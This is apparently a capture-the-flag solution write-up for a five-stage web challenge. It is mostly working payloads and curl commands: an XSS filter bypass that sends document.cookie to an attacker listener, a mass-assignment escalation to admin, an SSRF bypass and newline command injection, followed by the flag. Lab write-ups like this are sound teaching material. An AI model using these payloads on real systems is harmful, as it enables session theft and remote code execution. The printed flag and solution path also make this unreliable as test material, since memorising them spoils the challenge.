# Solution: Intranet of Insanity

## Overview

This is a 5-stage web exploitation challenge requiring players to chain together:
DOM-based XSS → Session Theft → Mass Assignment → SSRF → Command Injection

## Stage 1: DOM-Based XSS

The Employee Directory search feature reads the query from `location.hash` and renders
it into the page using `innerHTML`. A client-side `sanitizeSearch()` function in
`public/js/app.js` attempts to block XSS but uses an incomplete blocklist approach.

### The Vulnerable Code (`app.js`)

```javascript
function handleHashChange() {
    var hash = location.hash;
    var hashParams = new URLSearchParams(hash.substring(1));
    var searchQuery = hashParams.get('search');
    if (searchQuery) {
        var sanitized = sanitizeSearch(searchQuery);
        resultsHeader.innerHTML = 'Search results for: <b>' + sanitized + '</b>';
    }
}
```

### The Filter

`sanitizeSearch()` blocks:
- `<script>` tags
- 6 event handlers: `onerror`, `onload`, `onclick`, `onmouseover`, `onfocus`, `onblur`
- `javascript:` URIs

### The Bypass

The filter only blocks 6 specific event handlers. Dozens of others work:
- `<details open ontoggle=...>` — `ontoggle` is not blocked
- `<svg><animate onbegin=...>` — `onbegin` is not blocked
- `<marquee onstart=...>` — `onstart` is not blocked
- `<img src=x onpointerover=...>` — `onpointerover` is not blocked

### Test Payload

```
http://CHALLENGE_HOST:1339/#search=<details open ontoggle=alert(1)>
```

---

## Stage 2: Session Theft via XSS

Players set up their own HTTP listener (e.g., `python3 -m http.server`, ngrok, etc.)
and craft an XSS payload that exfiltrates the victim's `document.cookie`.

### Exfiltration Payload

**Important**: The hash is parsed by `URLSearchParams`, which decodes `+` as a space.
You must avoid the `+` operator — use template literals instead.

```
http://CHALLENGE_HOST:1339/#search=<svg><animate onbegin=fetch(`http://ATTACKER/c=${document.cookie}`) attributeName=x dur=1s>
```

### Triggering the Bot

Submit the XSS URL to the IT Help Desk (via the web form or curl):

```bash
curl -X POST http://CHALLENGE_HOST:1339/api/helpdesk/report \
  -H "Content-Type: application/json" \
  -d '{"url": "http://CHALLENGE_HOST:1339/#search=<svg><animate onbegin=fetch(`http://ATTACKER/c=${document.cookie}`) attributeName=x dur=1s>"}'
```

The bot (running Puppeteer with `httpOnly: false` cookies) visits the URL as `sarah_IT`,
triggering the XSS payload. The cookie is sent to the attacker's server.

### What You Receive

On your listener, you'll see a request like:
```
GET /steal?c=session=a1b2c3d4e5f6... HTTP/1.1
```

---

## Stage 3: Mass Assignment Privilege Escalation

With sarah_IT's session cookie, the player discovers the profile update endpoint uses
`Object.assign(user, req.body)` with no field filtering.

### Discover the Vulnerability

In `server.js`, the `PUT /api/profile` handler:
```javascript
// TODO: add input validation - only allow display_name, department, status_message
// For now, just merge everything (Dave says it's fine since it's an internal app)
Object.assign(user, updates);
```

The profile API response includes `role: "employee"`.

### Exploit

```bash
curl -X PUT http://CHALLENGE_HOST:1339/api/profile \
  -H "Content-Type: application/json" \
  -b "session=<JENNY_SESSION_TOKEN>" \
  -d '{"role": "admin"}'
```

Response:
```json
{
  "success": true,
  "message": "Profile updated successfully!",
  "user": { "role": "admin", ... }
}
```

The session is updated server-side, granting immediate admin access.

---

## Stage 4: SSRF from Admin Panel

The admin panel's "Website Availability Checker" (`POST /api/admin/check-website`)
makes server-side HTTP requests and returns a preview of the response.

### The SSRF Filter

Blocks: `localhost`, `127.0.0.1`, `::1`, `0.0.0.0`, and private IP ranges
(`10.x`, `192.168.x`, `172.16-31.x`).

### The Bypass

The Docker service name `internal-app` is not an IP address and bypasses all filters.
Players discover this hostname from:
- `docker-compose.yml` (source code is provided)
- The admin dashboard's "Network Topology" section showing `internal-app:5000`

### Exploit

```bash
curl -X POST http://CHALLENGE_HOST:1339/api/admin/check-website \
  -H "Content-Type: application/json" \
  -b "session=<ADMIN_SESSION_TOKEN>" \
  -d '{"url": "http://internal-app:5000/"}'
```

Response preview shows the Program Launcher service details, including the
`GET /run?cmd=<program>` API.

---

## Stage 5: Command Injection on Internal Service

The internal Program Launcher service at `internal-app:5000` accepts a `cmd` parameter
and executes it via `subprocess.check_output(shell=True)`.

### The Character Filter

Blocks: `;`, `|`, `&`, `` ` ``, `$`, `(`, `)`, `{`, `}`, `<`, `>`

### The Bypass: Newline Injection

The newline character (`\n`, URL-encoded as `%0a`) is NOT in the blocklist.
In bash, a newline acts as a command separator, just like `;`.

### Final Exploit

```bash
curl -X POST http://CHALLENGE_HOST:1339/api/admin/check-website \
  -H "Content-Type: application/json" \
  -b "session=<ADMIN_SESSION_TOKEN>" \
  -d '{"url": "http://internal-app:5000/run?cmd=id%0acat%20/flag.txt"}'
```

The shell receives:
```
echo "Launching: id
cat /flag.txt" && id
cat /flag.txt
```

The newline causes `cat /flag.txt` to execute as a separate command.

### Response

The Website Checker's preview field contains:
```
{"program":"id\ncat /flag.txt","output":"Launching: id\ncat /flag.txt\nuid=65534(nobody)...\nRCCTF{th3_90s_c4ll3d_th3y_w4nt_th31r_sh3ll_b4ck}\n","status":"OK"}
```

---

## Complete Attack Chain Summary

```
1. Read source code (white-box)
   ├── Identify sanitizeSearch() blocklist in app.js
   ├── Identify Object.assign() mass assignment in server.js
   ├── Identify SSRF in /api/admin/check-website
   ├── Identify internal-app:5000 from docker-compose.yml
   └── Identify command injection in internal-app/server.py

2. DOM-Based XSS
   ├── Craft payload: #search=<svg><animate onbegin=fetch(`http://ATTACKER/c=${document.cookie}`) attributeName=x dur=1s>
   └── Bypass: onbegin is not in the sanitizeSearch() blocklist; template literals avoid + being eaten by URLSearchParams

3. Session Theft
   ├── Set up external HTTP listener
   ├── Submit XSS URL to IT Help Desk: POST /api/helpdesk/report
   ├── Bot visits URL as sarah_IT, XSS fires, cookie exfiltrated
   └── Capture session token from callback

4. Mass Assignment
   ├── Set sarah_IT's session cookie
   ├── PUT /api/profile with body: {"role": "admin"}
   └── Verify: GET /api/admin/dashboard returns 200

5. SSRF
   ├── POST /api/admin/check-website with: {"url": "http://internal-app:5000/"}
   └── Response shows the Run dialog service details

6. Command Injection
   ├── POST /api/admin/check-website with: {"url": "http://internal-app:5000/run?cmd=id%0acat%20/flag.txt"}
   ├── Newline (%0a) bypasses character filter
   └── Flag returned in response preview
```

## Flag

```
RCCTF{th3_90s_c4ll3d_th3y_w4nt_th31r_sh3ll_b4ck}
```
